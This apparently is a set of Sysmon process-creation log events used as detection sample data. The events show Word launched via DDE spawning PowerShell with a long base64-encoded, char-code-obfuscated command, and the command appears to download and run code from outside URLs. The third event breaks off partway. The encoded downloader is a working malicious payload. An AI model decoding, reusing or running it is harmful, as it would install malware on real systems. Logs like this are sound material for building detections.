{
  "Event": {
    "EventData": {
      "CommandLine": "poWERShell -e IAAiACQAKAAgAFMAZQBUAC0AdgBBAHIAaQBhAEIATABlACAAJwBPAEYAcwAnACAAIAAnACcAIAApACIAIAArACAAWwBzAHQAUgBpAG4AZwBdAFsAYwBIAGEAUgBbAF0AXQAgACgAMwA2ACAALAAxADEAOQAgACwAMQAxADUALAA5ADkAIAAsACAAMQAxADQALAAxADAANQAgACwAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMwAyACAALAA2ADEALAAgADMAMgAsADEAMQAwACwAIAAxADAAMQAsACAAMQAxADkALAA0ADUALAAgADEAMQAxACAALAA5ADgALAAgADEAMAA2ACAALAAgADEAMAAxACwAOQA5ACwAMQAxADYAIAAsACAAMwAyACwANAA1ACAALAA2ADcAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAxADEANgAsACAAMwAyACAALAAgADgANwAgACwAOAAzACwAIAA5ADkALAAgADEAMQA0ACAALAAgADEAMAA1ACwAIAAxADEAMgAsACAAMQAxADYAIAAsADQANgAsADgAMwAsACAAMQAwADQALAAgADEAMAAxACwAIAAxADAAOAAgACwAMQAwADgALAA1ADkALAAzADYAIAAsACAAMQAxADkALAAxADAAMQAgACwAOQA4ACAALAAgADkAOQAsADEAMAA4ACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsADEAMQA2ACwAMwAyACwAIAA2ADEAIAAsADMAMgAsADEAMQAwACwAIAAxADAAMQAgACwAMQAxADkALAAgADQANQAgACwAIAAxADEAMQAsADkAOAAsADEAMAA2ACwAIAAxADAAMQAsADkAOQAgACwAMQAxADYAIAAsACAAMwAyACAALAA4ADMALAAxADIAMQAgACwAIAAxADEANQAgACwAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkAIAAsACAANAA2ACAALAAgADcAOAAsADEAMAAxACAALAAgADEAMQA2ACAALAA0ADYAIAAsACAAOAA3ACwAMQAwADEALAAgADkAOAAgACwAIAA2ADcAIAAsADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAAxACAALAAxADEAMAAgACwAMQAxADYAIAAsADUAOQAsACAAMwA2ACwAIAAxADEANAAgACwAOQA3ACwAIAAxADEAMAAgACwAMQAwADAAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsADMAMgAgACwAIAA2ADEALAAgADMAMgAsADEAMQAwACwAMQAwADEALAAxADEAOQAsACAANAA1ACAALAAxADEAMQAgACwAIAA5ADgALAAxADAANgAgACwAIAAxADAAMQAsACAAOQA5ACwAIAAxADEANgAgACwAMwAyACAALAAgADEAMQA0ACAALAAgADkANwAgACwAIAAxADEAMAAgACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsADUAOQAgACwAMwA2ACwAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAgACwAMQAxADUAIAAsADMAMgAgACwAIAA2ADEALAAzADIALAAzADkAIAAsADEAMAA0ACwAMQAxADYALAAxADEANgAsACAAMQAxADIAIAAsADUAOAAgACwAIAA0ADcAIAAsACAANAA3ACAALAA5ADkAIAAsADEAMQA2ACwAMQAwADkAIAAsACAAMQAwADcALAAxADAAMQAgACwAIAAxADEANgAgACwAIAA0ADYAIAAsADkAOQAsACAAMQAxADEAIAAsADEAMAA5ACAALAA0ADcAIAAsACAANwAwACwAMQAxADkALAAgADEAMAAwACwANgA2ACwAMQAwADQAIAAsACAAMQAxADEALAA0ADcALAAgADQANAAsADEAMAA0ACwAIAAxADEANgAgACwAIAAxADEANgAsADEAMQAyACwAIAA1ADgAIAAsADQANwAsADQANwAsACAAMQAxADMALAA0ADUAIAAsACAAMQAxADIAIAAsACAAMQAxADQALAAxADEAMQAsADEAMAAwACAALAAxADEANwAgACwAOQA5ACwAIAAxADEANgAgACwAMQAwADUALAAxADEAMQAsACAAMQAxADAALAAxADEANQAgACwANAA2ACwAOQA5ACwAIAAxADEAMQAgACwAIAAxADAAOQAsADQANwAgACwAIAAxADAANgAsADEAMAA3ACwAOAA4ACAALAAgADcAMgAsADgAMwAsADcANQAsACAAOAAzACAALAA3ADEALAAxADAANgAsACAANAA3ACAALAAgADQANAAsACAAMQAwADQAIAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsADEAMQA2ACwAMQAxADEAIAAsACAAMQAxADEALAAxADAAOAAsADEAMAAzACwAMQAwADEAIAAsACAAMQAwADEAIAAsACAAMQAwADcAIAAsADEAMAAxACwAIAAxADEANAAsADQANgAsADkAOQAgACwAMQAxADEALAAxADAAOQAgACwAIAA0ADcAIAAsADEAMgAxACwAIAA4ADEALAAgADQANwAsACAANAA0ACwAIAAxADAANAAgACwAMQAxADYALAAxADEANgAsADEAMQAyACwANQA4ACAALAA0ADcAIAAsADQANwAgACwAMQAxADEALAAgADEAMQAyACAALAA5ADcALAAxADEANAAgACwAIAA5ADcALAAgADQANgAgACwAIAA5ADkAIAAsACAAMQAxADEAIAAsACAANAA2ACAALAAxADIAMgAsADkANwAgACwANAA3ACAALAAxADAANAAgACwAMQAwADgALAA5ADAALAA4ADcALAAxADEAMgAsACAAMQAxADkAIAAsACAAOAA5ACAALAAgADcAMAAsACAAOAAyACAALAA0ADcAIAAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsACAAMQAxADIALAA1ADgAIAAsACAANAA3ACwANAA3ACAALAAgADEAMAAzACwAMQAxADEALAAxADEAMQAgACwAMQAwADAAIAAsACAAMQAwADkAIAAsADkANwAsADEAMQAwACwAIAAxADEANQAsACAAOQA4ACwAOQA4ACwAIAAxADEAMwAgACwAIAA0ADYALAA5ADkALAAxADEAMQAsACAAMQAwADkALAA0ADcAIAAsADEAMQAzACAALAAgADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAA1ACwAIAA3ADUALAAgADgANQAsADgAMgAsACAAMQAwADUALAAgADQANwAsACAAMwA5ACwANAA2ACwAOAAzACAALAAxADEAMgAgACwAIAAxADAAOAAgACwAMQAwADUALAAxADEANgAsADQAMAAgACwAMwA5ACwANAA0ACAALAAgADMAOQAsADQAMQAsACAANQA5ACwAIAAzADYALAAgADEAMQAwACAALAA5ADcAIAAsACAAMQAwADkAIAAsACAAMQAwADEALAAgADMAMgAgACwAIAA2ADEAIAAsADMAMgAsACAAMwA2ACAALAAgADEAMQA0ACwAOQA3ACwAIAAxADEAMAAsADEAMAAwACAALAAgADEAMQAxACwAIAAxADAAOQAsADQANgAsADEAMQAwACAALAAxADAAMQAsACAAMQAyADAAIAAsACAAMQAxADYAIAAsACAANAAwACAALAA0ADkAIAAsACAANAA0ACAALAAgADMAMgAsACAANQA0ACwAIAA1ADMAIAAsADUAMwAsADUAMQAgACwAIAA1ADQAIAAsACAANAAxACwAIAA1ADkALAAgADMANgAgACwAIAAxADEAMgAgACwAIAA5ADcALAAgADEAMQA2ACwAMQAwADQALAAzADIAIAAsADYAMQAsACAAMwAyACwAMwA2ACAALAAgADEAMAAxACwAIAAxADEAMAAgACwAMQAxADgAIAAsADUAOAAsACAAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkALAAgADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAgACwAIAAzADkAIAAsADkAMgAsACAAMwA5ACAALAAgADMAMgAgACwAIAA0ADMAIAAsACAAMwAyACwAIAAzADYAIAAsACAAMQAxADAALAAgADkANwAsADEAMAA5ACwAIAAxADAAMQAgACwAIAAzADIAIAAsACAANAAzACAALAAzADIAIAAsACAAMwA5ACAALAAgADQANgAgACwAIAAxADAAMQAsADEAMgAwACAALAAgADEAMAAxACAALAAgADMAOQAgACwANQA5ACwAMQAwADIALAAgADEAMQAxACAALAAgADEAMQA0ACAALAAxADAAMQAsACAAOQA3ACAALAAgADkAOQAsADEAMAA0ACAALAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAsADMAMgAsACAAMQAwADUALAAgADEAMQAwACAALAAgADMAMgAsADMANgAgACwAIAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsACAAMQAxADUAIAAsACAANAAxACAALAAgADEAMgAzACAALAAgADEAMQA2ACAALAAgADEAMQA0ACwAIAAxADIAMQAsADEAMgAzACAALAAgADMANgAgACwAMQAxADkALAAgADEAMAAxACwAOQA4ACwAIAA5ADkALAAxADAAOAAsADEAMAA1ACwAMQAwADEALAAgADEAMQAwACAALAAxADEANgAgACwANAA2ACAALAA2ADgALAAgADEAMQAxACAALAAgADEAMQA5ACAALAAxADEAMAAgACwAMQAwADgALAAxADEAMQAgACwAIAA5ADcALAAgADEAMAAwACwAIAA3ADAAIAAsACAAMQAwADUAIAAsADEAMAA4ACAALAAgADEAMAAxACwANAAwACAALAAgADMANgAgACwAIAAxADEANwAsADEAMQA0ACwAIAAxADAAOAAgACwAIAA0ADYAIAAsADgANAAgACwAMQAxADEALAA4ADMAIAAsACAAMQAxADYALAAxADEANAAgACwAIAAxADAANQAgACwAMQAxADAAIAAsACAAMQAwADMALAA0ADAALAA0ADEAIAAsACAANAA0ACAALAAzADIAIAAsACAAMwA2ACAALAAxADEAMgAsADkANwAsADEAMQA2ACAALAAxADAANAAgACwANAAxACAALAAgADUAOQAsACAAOAAzACwAMQAxADYAIAAsACAAOQA3ACwAMQAxADQAIAAsADEAMQA2ACwAIAA0ADUAIAAsACAAOAAwACAALAAgADEAMQA0ACwAMQAxADEAIAAsADkAOQAgACwAIAAxADAAMQAsACAAMQAxADUAIAAsADEAMQA1ACAALAAgADMAMgAsACAAMwA2ACAALAAxADEAMgAsADkANwAgACwAIAAxADEANgAsACAAMQAwADQAIAAsACAANQA5ACAALAAgADkAOAAsACAAMQAxADQAIAAsACAAMQAwADEAIAAsACAAOQA3ACAALAAxADAANwAsACAANQA5ACAALAAxADIANQAgACwAOQA5ACwAIAA5ADcAIAAsACAAMQAxADYAIAAsADkAOQAsACAAMQAwADQALAAxADIAMwAgACwAIAAxADEAOQAgACwAIAAxADEANAAsADEAMAA1ACAALAAgADEAMQA2ACAALAAxADAAMQAsACAANAA1ACwAIAAxADAANAAgACwAIAAxADEAMQAgACwAMQAxADUAIAAsACAAMQAxADYALAAzADIALAAzADYAIAAsACAAOQA1ACwANAA2ACwANgA5ACwAIAAxADIAMAAgACwAIAA5ADkAIAAsACAAMQAwADEAIAAsACAAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMQAwADUALAAgADEAMQAxACAALAAgADEAMQAwACwANAA2ACwAIAA3ADcAIAAsADEAMAAxACwAIAAxADEANQAgACwAMQAxADUALAA5ADcAIAAsADEAMAAzACAALAAgADEAMAAxACAALAAgADUAOQAgACwAIAAxADIANQAgACwAIAAxADIANQApACAAKwAiACQAKAAgAFMARQBUAC0ASQB0AEUATQAgACAAJwBWAEEAcgBpAGEAQgBMAGUAOgBvAGYAcwAnACAAIAAnACAAJwAgACkAIAAiAHwAIAAmACgAKABnAFYAIAAnACoAbQBEAHIAKgAnACkALgBOAEEAbQBlAFsAMwAsADEAMQAsADIAXQAtAEoATwBpAG4AJwAnACkADQAKAA==",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Documents\\",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
      "ParentProcessGuid": "49F1AF32-4730-59DB-0000-0010A9950700",
      "ParentProcessId": "2168",
      "ProcessGuid": "49F1AF32-48F8-59DB-0000-001000500D00",
      "ProcessId": "2080",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "33263",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "poWERShell -e IAAiACQAKAAgAFMAZQBUAC0AdgBBAHIAaQBhAEIATABlACAAJwBPAEYAcwAnACAAIAAnACcAIAApACIAIAArACAAWwBzAHQAUgBpAG4AZwBdAFsAYwBIAGEAUgBbAF0AXQAgACgAMwA2ACAALAAxADEAOQAgACwAMQAxADUALAA5ADkAIAAsACAAMQAxADQALAAxADAANQAgACwAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMwAyACAALAA2ADEALAAgADMAMgAsADEAMQAwACwAIAAxADAAMQAsACAAMQAxADkALAA0ADUALAAgADEAMQAxACAALAA5ADgALAAgADEAMAA2ACAALAAgADEAMAAxACwAOQA5ACwAMQAxADYAIAAsACAAMwAyACwANAA1ACAALAA2ADcAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAxADEANgAsACAAMwAyACAALAAgADgANwAgACwAOAAzACwAIAA5ADkALAAgADEAMQA0ACAALAAgADEAMAA1ACwAIAAxADEAMgAsACAAMQAxADYAIAAsADQANgAsADgAMwAsACAAMQAwADQALAAgADEAMAAxACwAIAAxADAAOAAgACwAMQAwADgALAA1ADkALAAzADYAIAAsACAAMQAxADkALAAxADAAMQAgACwAOQA4ACAALAAgADkAOQAsADEAMAA4ACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsADEAMQA2ACwAMwAyACwAIAA2ADEAIAAsADMAMgAsADEAMQAwACwAIAAxADAAMQAgACwAMQAxADkALAAgADQANQAgACwAIAAxADEAMQAsADkAOAAsADEAMAA2ACwAIAAxADAAMQAsADkAOQAgACwAMQAxADYAIAAsACAAMwAyACAALAA4ADMALAAxADIAMQAgACwAIAAxADEANQAgACwAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkAIAAsACAANAA2ACAALAAgADcAOAAsADEAMAAxACAALAAgADEAMQA2ACAALAA0ADYAIAAsACAAOAA3ACwAMQAwADEALAAgADkAOAAgACwAIAA2ADcAIAAsADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAAxACAALAAxADEAMAAgACwAMQAxADYAIAAsADUAOQAsACAAMwA2ACwAIAAxADEANAAgACwAOQA3ACwAIAAxADEAMAAgACwAMQAwADAAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsADMAMgAgACwAIAA2ADEALAAgADMAMgAsADEAMQAwACwAMQAwADEALAAxADEAOQAsACAANAA1ACAALAAxADEAMQAgACwAIAA5ADgALAAxADAANgAgACwAIAAxADAAMQAsACAAOQA5ACwAIAAxADEANgAgACwAMwAyACAALAAgADEAMQA0ACAALAAgADkANwAgACwAIAAxADEAMAAgACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsADUAOQAgACwAMwA2ACwAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAgACwAMQAxADUAIAAsADMAMgAgACwAIAA2ADEALAAzADIALAAzADkAIAAsADEAMAA0ACwAMQAxADYALAAxADEANgAsACAAMQAxADIAIAAsADUAOAAgACwAIAA0ADcAIAAsACAANAA3ACAALAA5ADkAIAAsADEAMQA2ACwAMQAwADkAIAAsACAAMQAwADcALAAxADAAMQAgACwAIAAxADEANgAgACwAIAA0ADYAIAAsADkAOQAsACAAMQAxADEAIAAsADEAMAA5ACAALAA0ADcAIAAsACAANwAwACwAMQAxADkALAAgADEAMAAwACwANgA2ACwAMQAwADQAIAAsACAAMQAxADEALAA0ADcALAAgADQANAAsADEAMAA0ACwAIAAxADEANgAgACwAIAAxADEANgAsADEAMQAyACwAIAA1ADgAIAAsADQANwAsADQANwAsACAAMQAxADMALAA0ADUAIAAsACAAMQAxADIAIAAsACAAMQAxADQALAAxADEAMQAsADEAMAAwACAALAAxADEANwAgACwAOQA5ACwAIAAxADEANgAgACwAMQAwADUALAAxADEAMQAsACAAMQAxADAALAAxADEANQAgACwANAA2ACwAOQA5ACwAIAAxADEAMQAgACwAIAAxADAAOQAsADQANwAgACwAIAAxADAANgAsADEAMAA3ACwAOAA4ACAALAAgADcAMgAsADgAMwAsADcANQAsACAAOAAzACAALAA3ADEALAAxADAANgAsACAANAA3ACAALAAgADQANAAsACAAMQAwADQAIAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsADEAMQA2ACwAMQAxADEAIAAsACAAMQAxADEALAAxADAAOAAsADEAMAAzACwAMQAwADEAIAAsACAAMQAwADEAIAAsACAAMQAwADcAIAAsADEAMAAxACwAIAAxADEANAAsADQANgAsADkAOQAgACwAMQAxADEALAAxADAAOQAgACwAIAA0ADcAIAAsADEAMgAxACwAIAA4ADEALAAgADQANwAsACAANAA0ACwAIAAxADAANAAgACwAMQAxADYALAAxADEANgAsADEAMQAyACwANQA4ACAALAA0ADcAIAAsADQANwAgACwAMQAxADEALAAgADEAMQAyACAALAA5ADcALAAxADEANAAgACwAIAA5ADcALAAgADQANgAgACwAIAA5ADkAIAAsACAAMQAxADEAIAAsACAANAA2ACAALAAxADIAMgAsADkANwAgACwANAA3ACAALAAxADAANAAgACwAMQAwADgALAA5ADAALAA4ADcALAAxADEAMgAsACAAMQAxADkAIAAsACAAOAA5ACAALAAgADcAMAAsACAAOAAyACAALAA0ADcAIAAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsACAAMQAxADIALAA1ADgAIAAsACAANAA3ACwANAA3ACAALAAgADEAMAAzACwAMQAxADEALAAxADEAMQAgACwAMQAwADAAIAAsACAAMQAwADkAIAAsADkANwAsADEAMQAwACwAIAAxADEANQAsACAAOQA4ACwAOQA4ACwAIAAxADEAMwAgACwAIAA0ADYALAA5ADkALAAxADEAMQAsACAAMQAwADkALAA0ADcAIAAsADEAMQAzACAALAAgADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAA1ACwAIAA3ADUALAAgADgANQAsADgAMgAsACAAMQAwADUALAAgADQANwAsACAAMwA5ACwANAA2ACwAOAAzACAALAAxADEAMgAgACwAIAAxADAAOAAgACwAMQAwADUALAAxADEANgAsADQAMAAgACwAMwA5ACwANAA0ACAALAAgADMAOQAsADQAMQAsACAANQA5ACwAIAAzADYALAAgADEAMQAwACAALAA5ADcAIAAsACAAMQAwADkAIAAsACAAMQAwADEALAAgADMAMgAgACwAIAA2ADEAIAAsADMAMgAsACAAMwA2ACAALAAgADEAMQA0ACwAOQA3ACwAIAAxADEAMAAsADEAMAAwACAALAAgADEAMQAxACwAIAAxADAAOQAsADQANgAsADEAMQAwACAALAAxADAAMQAsACAAMQAyADAAIAAsACAAMQAxADYAIAAsACAANAAwACAALAA0ADkAIAAsACAANAA0ACAALAAgADMAMgAsACAANQA0ACwAIAA1ADMAIAAsADUAMwAsADUAMQAgACwAIAA1ADQAIAAsACAANAAxACwAIAA1ADkALAAgADMANgAgACwAIAAxADEAMgAgACwAIAA5ADcALAAgADEAMQA2ACwAMQAwADQALAAzADIAIAAsADYAMQAsACAAMwAyACwAMwA2ACAALAAgADEAMAAxACwAIAAxADEAMAAgACwAMQAxADgAIAAsADUAOAAsACAAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkALAAgADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAgACwAIAAzADkAIAAsADkAMgAsACAAMwA5ACAALAAgADMAMgAgACwAIAA0ADMAIAAsACAAMwAyACwAIAAzADYAIAAsACAAMQAxADAALAAgADkANwAsADEAMAA5ACwAIAAxADAAMQAgACwAIAAzADIAIAAsACAANAAzACAALAAzADIAIAAsACAAMwA5ACAALAAgADQANgAgACwAIAAxADAAMQAsADEAMgAwACAALAAgADEAMAAxACAALAAgADMAOQAgACwANQA5ACwAMQAwADIALAAgADEAMQAxACAALAAgADEAMQA0ACAALAAxADAAMQAsACAAOQA3ACAALAAgADkAOQAsADEAMAA0ACAALAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAsADMAMgAsACAAMQAwADUALAAgADEAMQAwACAALAAgADMAMgAsADMANgAgACwAIAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsACAAMQAxADUAIAAsACAANAAxACAALAAgADEAMgAzACAALAAgADEAMQA2ACAALAAgADEAMQA0ACwAIAAxADIAMQAsADEAMgAzACAALAAgADMANgAgACwAMQAxADkALAAgADEAMAAxACwAOQA4ACwAIAA5ADkALAAxADAAOAAsADEAMAA1ACwAMQAwADEALAAgADEAMQAwACAALAAxADEANgAgACwANAA2ACAALAA2ADgALAAgADEAMQAxACAALAAgADEAMQA5ACAALAAxADEAMAAgACwAMQAwADgALAAxADEAMQAgACwAIAA5ADcALAAgADEAMAAwACwAIAA3ADAAIAAsACAAMQAwADUAIAAsADEAMAA4ACAALAAgADEAMAAxACwANAAwACAALAAgADMANgAgACwAIAAxADEANwAsADEAMQA0ACwAIAAxADAAOAAgACwAIAA0ADYAIAAsADgANAAgACwAMQAxADEALAA4ADMAIAAsACAAMQAxADYALAAxADEANAAgACwAIAAxADAANQAgACwAMQAxADAAIAAsACAAMQAwADMALAA0ADAALAA0ADEAIAAsACAANAA0ACAALAAzADIAIAAsACAAMwA2ACAALAAxADEAMgAsADkANwAsADEAMQA2ACAALAAxADAANAAgACwANAAxACAALAAgADUAOQAsACAAOAAzACwAMQAxADYAIAAsACAAOQA3ACwAMQAxADQAIAAsADEAMQA2ACwAIAA0ADUAIAAsACAAOAAwACAALAAgADEAMQA0ACwAMQAxADEAIAAsADkAOQAgACwAIAAxADAAMQAsACAAMQAxADUAIAAsADEAMQA1ACAALAAgADMAMgAsACAAMwA2ACAALAAxADEAMgAsADkANwAgACwAIAAxADEANgAsACAAMQAwADQAIAAsACAANQA5ACAALAAgADkAOAAsACAAMQAxADQAIAAsACAAMQAwADEAIAAsACAAOQA3ACAALAAxADAANwAsACAANQA5ACAALAAxADIANQAgACwAOQA5ACwAIAA5ADcAIAAsACAAMQAxADYAIAAsADkAOQAsACAAMQAwADQALAAxADIAMwAgACwAIAAxADEAOQAgACwAIAAxADEANAAsADEAMAA1ACAALAAgADEAMQA2ACAALAAxADAAMQAsACAANAA1ACwAIAAxADAANAAgACwAIAAxADEAMQAgACwAMQAxADUAIAAsACAAMQAxADYALAAzADIALAAzADYAIAAsACAAOQA1ACwANAA2ACwANgA5ACwAIAAxADIAMAAgACwAIAA5ADkAIAAsACAAMQAwADEAIAAsACAAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMQAwADUALAAgADEAMQAxACAALAAgADEAMQAwACwANAA2ACwAIAA3ADcAIAAsADEAMAAxACwAIAAxADEANQAgACwAMQAxADUALAA5ADcAIAAsADEAMAAzACAALAAgADEAMAAxACAALAAgADUAOQAgACwAIAAxADIANQAgACwAIAAxADIANQApACAAKwAiACQAKAAgAFMARQBUAC0ASQB0AEUATQAgACAAJwBWAEEAcgBpAGEAQgBMAGUAOgBvAGYAcwAnACAAIAAnACAAJwAgACkAIAAiAHwAIAAmACgAKABnAFYAIAAnACoAbQBEAHIAKgAnACkALgBOAEEAbQBlAFsAMwAsADEAMQAsADIAXQAtAEoATwBpAG4AJwAnACkADQAKAA==",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Documents\\",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
      "ParentProcessGuid": "49F1AF32-4730-59DB-0000-0010A9950700",
      "ParentProcessId": "2168",
      "ProcessGuid": "49F1AF32-48FC-59DB-0000-001025730D00",
      "ProcessId": "2500",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "33548",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "poWERShell -e IAAiACQAKAAgAFMAZQBUAC0AdgBBAHIAaQBhAEIATABlACAAJwBPAEYAcwAnACAAIAAnACcAIAApACIAIAArACAAWwBzAHQAUgBpAG4AZwBdAFsAYwBIAGEAUgBbAF0AXQAgACgAMwA2ACAALAAxADEAOQAgACwAMQAxADUALAA5ADkAIAAsACAAMQAxADQALAAxADAANQAgACwAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMwAyACAALAA2ADEALAAgADMAMgAsADEAMQAwACwAIAAxADAAMQAsACAAMQAxADkALAA0ADUALAAgADEAMQAxACAALAA5ADgALAAgADEAMAA2ACAALAAgADEAMAAxACwAOQA5ACwAMQAxADYAIAAsACAAMwAyACwANAA1ACAALAA2ADcAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsACAANwA5ACwAOQA4ACAALAAxADAANgAgACwAMQAwADEALAA5ADkALAAxADEANgAsACAAMwAyACAALAAgADgANwAgACwAOAAzACwAIAA5ADkALAAgADEAMQA0ACAALAAgADEAMAA1ACwAIAAxADEAMgAsACAAMQAxADYAIAAsADQANgAsADgAMwAsACAAMQAwADQALAAgADEAMAAxACwAIAAxADAAOAAgACwAMQAwADgALAA1ADkALAAzADYAIAAsACAAMQAxADkALAAxADAAMQAgACwAOQA4ACAALAAgADkAOQAsADEAMAA4ACwAIAAxADAANQAsADEAMAAxACwAIAAxADEAMAAsADEAMQA2ACwAMwAyACwAIAA2ADEAIAAsADMAMgAsADEAMQAwACwAIAAxADAAMQAgACwAMQAxADkALAAgADQANQAgACwAIAAxADEAMQAsADkAOAAsADEAMAA2ACwAIAAxADAAMQAsADkAOQAgACwAMQAxADYAIAAsACAAMwAyACAALAA4ADMALAAxADIAMQAgACwAIAAxADEANQAgACwAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkAIAAsACAANAA2ACAALAAgADcAOAAsADEAMAAxACAALAAgADEAMQA2ACAALAA0ADYAIAAsACAAOAA3ACwAMQAwADEALAAgADkAOAAgACwAIAA2ADcAIAAsADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAAxACAALAAxADEAMAAgACwAMQAxADYAIAAsADUAOQAsACAAMwA2ACwAIAAxADEANAAgACwAOQA3ACwAIAAxADEAMAAgACwAMQAwADAAIAAsACAAMQAxADEAIAAsACAAMQAwADkAIAAsADMAMgAgACwAIAA2ADEALAAgADMAMgAsADEAMQAwACwAMQAwADEALAAxADEAOQAsACAANAA1ACAALAAxADEAMQAgACwAIAA5ADgALAAxADAANgAgACwAIAAxADAAMQAsACAAOQA5ACwAIAAxADEANgAgACwAMwAyACAALAAgADEAMQA0ACAALAAgADkANwAgACwAIAAxADEAMAAgACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsADUAOQAgACwAMwA2ACwAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAgACwAMQAxADUAIAAsADMAMgAgACwAIAA2ADEALAAzADIALAAzADkAIAAsADEAMAA0ACwAMQAxADYALAAxADEANgAsACAAMQAxADIAIAAsADUAOAAgACwAIAA0ADcAIAAsACAANAA3ACAALAA5ADkAIAAsADEAMQA2ACwAMQAwADkAIAAsACAAMQAwADcALAAxADAAMQAgACwAIAAxADEANgAgACwAIAA0ADYAIAAsADkAOQAsACAAMQAxADEAIAAsADEAMAA5ACAALAA0ADcAIAAsACAANwAwACwAMQAxADkALAAgADEAMAAwACwANgA2ACwAMQAwADQAIAAsACAAMQAxADEALAA0ADcALAAgADQANAAsADEAMAA0ACwAIAAxADEANgAgACwAIAAxADEANgAsADEAMQAyACwAIAA1ADgAIAAsADQANwAsADQANwAsAC